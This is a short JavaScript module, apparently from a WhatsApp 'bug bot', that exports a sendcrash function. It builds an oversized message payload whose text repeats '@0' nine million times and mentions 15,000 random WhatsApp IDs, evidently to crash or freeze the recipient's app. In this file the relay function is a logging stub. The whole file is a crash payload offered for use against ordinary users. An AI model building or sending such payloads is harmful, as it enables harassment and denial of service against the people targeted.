const aorbugz = {
    relayMessage: async (target, message, options) => {
        console.log(`Mengirim pesan ke: ${target}`);
        console.log(`Pesan: ${message.extendedTextMessage.text}`);
        return Promise.resolve();
    }
};

async function sendcrash(target, Ptcp = false) {
    await aorbugz.relayMessage(target, {
        extendedTextMessage: {
            text: "⩟⬦𪲁 H4NBUG!𝐒 -" + "@0".repeat(9000000),
            contextInfo: {
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({
                        length: 15000
                    }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
                ],
                stanzaId: "1234567890ABCDEF",
                participant: "0@s.whatsapp.net",
         
            }
        }
    }, Ptcp ? { participant: { jid: target } } : {});
}
module.exports = sendcrash;
